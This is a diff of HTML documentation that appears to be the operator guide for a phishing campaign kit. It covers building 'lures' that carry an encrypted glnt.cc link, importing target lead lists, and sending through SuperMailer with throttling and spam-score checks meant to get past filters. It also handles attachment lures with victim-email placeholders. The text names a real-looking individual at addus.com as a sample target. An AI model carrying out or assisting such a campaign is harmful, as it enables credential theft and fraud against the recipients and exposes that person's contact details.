@@ -670,12 +670,12 @@ dirk.allison@addus.com,Dirk,Allison,addus.com,first.last,Executive,...</code></p
 
 <p><strong>Merge Fields in Email Content:</strong></p>
 
-<p>When composing the HTML lure, SuperMailer replaces merge fields with the recipient's actual data:</p>
+<p>When composing the HTML lure, SuperMailer can use the following merge fields:</p>
 
-<pre><code>{FirstName}  &rarr;  Dirk
+<pre><code>{FirstName}  &rarr;  Dirk (informational &mdash; not used for greeting in BCC mode)
 {Email}      &rarr;  dirk.allison@addus.com</code></pre>
 
-<p>Use <code>{FirstName}</code> in the email body to personalize the lure (e.g., "Hello Dirk," instead of "Hello Colleague,"). This significantly boosts engagement rates.</p>
+<div class="note"><strong>BCC mode note:</strong> The email body is identical for all recipients. Per-recipient name personalization is not possible. The <code>{RECIPIENT_NAME}</code> placeholder is substituted at build time with a generic value (defaults to "Colleague"), producing greetings like "Hello Colleague," for all recipients.</div>
 
 <h3>6.3 Loading HTML Lures</h3>
 
@@ -1144,22 +1144,26 @@ open http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;</code></pre>
 cat CURRENT_LINK.txt
 # &rarr; https://glnt.cc/#&lt;encrypted-fragment&gt;
 
-# 2. Build the lure with the link embedded
-# (link is already embedded in campaign-emails/email/*.html files
-#  &mdash; just regenerate if you need a fresh link per campaign)
+# 2. Build the lure with the link embedded and a generic greeting (BCC mode)
+./scripts/build-campaign-email.sh \
+  shared-document \
+  "https://glnt.cc/#&lt;encrypted-fragment&gt;" \
+  /tmp/campaign-email.html
+# Name defaults to "Colleague" &mdash; all recipients see the same greeting
 
 # 3. In SuperMailer:
 #    Settings &rarr; SMTP Server &rarr; Port 587, STARTTLS, set throttle 50/hr
 #    Recipients &rarr; Import CSV &rarr; data/leads/&lt;target&gt;.csv
 #      Map: email&rarr;Email, first&rarr;FirstName, last&rarr;LastName
-#    Campaign &rarr; Message &rarr; HTML Source &rarr; paste campaign-emails/email/&lt;lure&gt;.html
+#    Campaign &rarr; Message &rarr; HTML Source &rarr; paste /tmp/campaign-email.html
 #    Sender: From Name matches lure brand, From Email = sender domain
 #    Send Test to yourself &rarr; verify at mail-tester.com (score 9+)
 #    Send Campaign &rarr; monitor bounce rate &lt;5%, cross-ref analytics dashboard
 
-# 4. For attachment lures:
+# 4. For attachment lures (use generic placeholders &mdash; BCC mode):
 #    Campaign &rarr; Message &rarr; write short body text
 #    Attach: campaign-emails/attachments/&lt;brand&gt;.html
+#    Replace ##victimemail## with generic text before attaching
 #    Sender must match the attachment brand
 #    Test by opening the attachment yourself before sending</code></pre>
 
